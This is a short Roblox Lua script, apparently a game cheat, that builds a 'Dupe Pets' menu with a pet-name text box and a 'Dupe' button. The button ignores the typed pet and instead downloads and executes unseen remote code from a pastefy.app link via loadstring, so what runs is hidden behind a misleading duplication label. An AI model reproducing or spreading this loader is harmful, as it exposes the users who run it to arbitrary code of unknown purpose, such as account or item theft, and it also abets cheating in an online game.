local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")

-- Вкладка Dupe Pet
local DupeTab = Window:NewTab("Dupe Pet")
local DupeSection = DupeTab:NewSection("")

-- Текстовое поле для ввода питомца
local PetInput = DupeSection:NewTextBox("", "Write any pet", function(text)
    -- Можно использовать введенный текст
end)
PetInput.Instance.Size = UDim2.new(0, 200, 0, 30)

-- Кнопка Dupe (исправлено название)
local DupeButton = DupeSection:NewButton("Dupe", "", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)
DupeButton.Instance.Size = UDim2.new(0, 100, 0, 30)

-- Вкладка Credits
local CreditsTab = Window:NewTab("Credits")
CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
